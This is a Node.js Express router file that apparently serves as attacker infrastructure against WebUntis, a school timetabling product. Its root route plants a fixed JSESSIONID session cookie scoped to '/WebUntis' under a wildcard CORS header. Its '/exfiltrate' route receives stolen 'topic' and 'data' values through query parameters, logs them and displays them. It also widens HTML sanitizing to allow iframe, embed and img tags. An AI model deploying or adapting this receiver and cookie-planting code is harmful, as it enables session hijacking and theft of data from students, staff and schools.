const { Router } = require('express');
const sanitizeHtml = require('sanitize-html');
const router = Router();

/**
 * @param {MongoConnector} db - The MongoDB connector instance.
 * @returns {Router} The router instance.
 */

sanitizeHtmlAllowedTags = sanitizeHtml.defaults.allowedTags.concat(['img', 'embed', 'iframe']);

module.exports = (db) => {

    router.get('/', async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.cookie('JSESSIONID', '322C9D625D286C70EEB5392638897ECC', { maxAge: 900000, httpOnly: true, sameSite: 'none', secure: true, path: '/WebUntis' });
        res.render('untis_init');
    });

    router.get('/exfiltrate', async (req, res) => {
        const topic = decodeURI(req.query.topic);
        const data = decodeURI(req.query.data);
        console.log(topic, data);

        res.render('untis_exfiltrate', {
            topic: topic,
            data: data
        });
    });

    return router;
};